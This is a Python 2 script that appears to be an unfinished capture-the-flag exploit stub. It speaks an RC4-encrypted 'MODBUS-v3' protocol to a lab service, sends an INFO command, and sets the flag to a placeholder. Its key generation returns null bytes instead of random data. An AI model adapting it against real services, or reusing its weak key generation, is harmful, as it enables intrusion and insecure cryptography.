import sys

class Exploit():
    class CClient(object):
        def Rc4InitTable(self,szKey, S):
            j=0
            for i in range(0,256):
                j = (j+S[i]+ord(szKey[i%len(szKey)]))%256
                t = S[i]
                S[i] = S[j]
                S[j] = t

        def Rc4CryptChar(self,c, S, index):
            i = index[0]
            j = index[1]
            i = (i+1)%256
            j = (j+S[i])%256
            t = S[i]
            S[i] = S[j]
            S[j] = t
            index[0] = i
            index[1] = j
            return chr(S[(S[i]+S[j])%256]^ord(c))


        def Rc4Crypt(self,szKey, szData):
            x = 0
            box = range(256)
            for i in range(256):
                x = (x + box[i] + ord(szKey[i % len(szKey)])) % 256
                box[i], box[x] = box[x], box[i]
            x = 0
            y = 0
            out = []
            for c in szData:
                x = (x + 1) % 256
                y = (y + box[x]) % 256
                box[x], box[y] = box[y], box[x]
                out.append(chr(ord(c) ^ box[(box[x] + box[y]) % 256]))

            return ''.join(out)

        def GenRandomString(self,iSize=20, chars=""):
            #import random
            #return ''.join(random.choice(chars) for x in range(iSize))
            return "\x00"*iSize

        def __init__(self, szIp, iPort, szMasterKey):
            self._szIp = szIp
            self._iPort = iPort
            self._szMasterKey = szMasterKey
            self._sock = None
            self._szKey = ""

        def _OpenConnection(self):
            # Open connection
            import socket,string,binascii
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.connect((self._szIp, self._iPort))

            self.__szClientKey = self.GenRandomString(40, string.ascii_uppercase + string.ascii_lowercase + string.digits)
            self._szKey = self._szMasterKey+self.__szClientKey


            #print binascii.hexlify(self.__szClientKey+"\n")
            # Send client part of the key
            self._sock.sendall(self.__szClientKey+"\n")
            return True

        def _CloseConnection(self):
            self._sock.close()
            return True

        def SendCommandGetAnswer(self, szCommand, dicRequest={}):
            import binascii
            szData = "MODBUS-v3\nCODE=%s\n" % (szCommand)
            print szData
            #szData = "MODBUS-v3\nFGID=1\n"
            for k in dicRequest.keys():
                szData += "%s=%s\n" % (k, dicRequest[k])
            szData += "\n"
            out=self.Rc4Crypt(self._szKey, szData)
            print "OUt: "+binascii.hexlify(out)
            self._sock.sendall(out, False)

            # Init rc4 to receive data
            index = [0,0]
            S = range(0,256)
            self.Rc4InitTable(self._szKey, S)

            # Receive the data
            szData = ""
            while szData.find("\n\n") == -1:
                d = self._sock.recv(1024)
                if d == None or len(d) == 0:
                    return None
                print "got: "+binascii.hexlify(d)
                for c in d:
                    szData += self.Rc4CryptChar(c, S, index)
                    #print szData

            return szData


    def execute(self, ip, port, flag_id):
        Client = Exploit.CClient(ip, port, sys.argv[1])
        Client._OpenConnection()
        #ans=Client.SendCommandGetAnswer("CTRL",{"FLID":"0"})
        ans=Client.SendCommandGetAnswer("INFO")
        print ans
        #self.flag=ans.split("\n")[-3].split("=")[1]
        self.flag="x"

    def result(self):
        return {'FLAG' : self.flag }

e= Exploit()
e.execute("10.105.0.54",6699,"")
print e.result()